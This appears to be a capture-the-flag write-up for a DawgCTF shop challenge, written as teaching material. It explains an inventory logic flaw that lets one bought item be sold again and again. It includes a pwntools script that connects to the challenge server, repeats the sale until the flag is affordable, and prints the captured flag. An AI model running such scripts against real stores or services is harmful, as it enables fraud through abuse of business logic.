# Tom nook the capitalist racoon

this was a C program to buy and sell items, our goal is to buy the flag which is worth 420000 bells<br>

```
Timmy: Welcome!
How can I help you today?
1. I want to sell
2. What's for sale?
3. See you later.
Choice: 2

8500 bells
Timmy: Here's what we have to sell today.
1. flimsy net - 400 bells
2. tarantula - 8000 bells
3. slingshot - 900 bells
4. sapling - 640 bells
5. cherry - 400 bells
6. flag - 420000 bells
```

when interacting with the program using netcat i noticed that if you buy an item and selling again<br>
it doesn't get removed from the inventory, so all we have to do is to buy one item and keep selling it<br>
until we accumulate enough money to buy the flag.<br>

[script.py](./script.py)
```python
#!/usr/bin/env python2

from pwn import *

conn = remote('ctf.umbccd.io', 4400)

#to sell all the items
for i in range(1,5):
    conn.sendline('1')
    conn.sendline(str(i))

#to buy an item
conn.sendline('2')
conn.sendline('2')

#keeps selling to accumulate money
for i in range(55):
    conn.sendline('1')
    conn.sendline('1')

#buy the flag
conn.sendline('2')
conn.sendline('6')
conn.sendline('1')

print conn.recvline_contains('DawgCTF')
conn.close()
```

### flag
DawgCTF{1nf1n1t3_t@rantul@$}
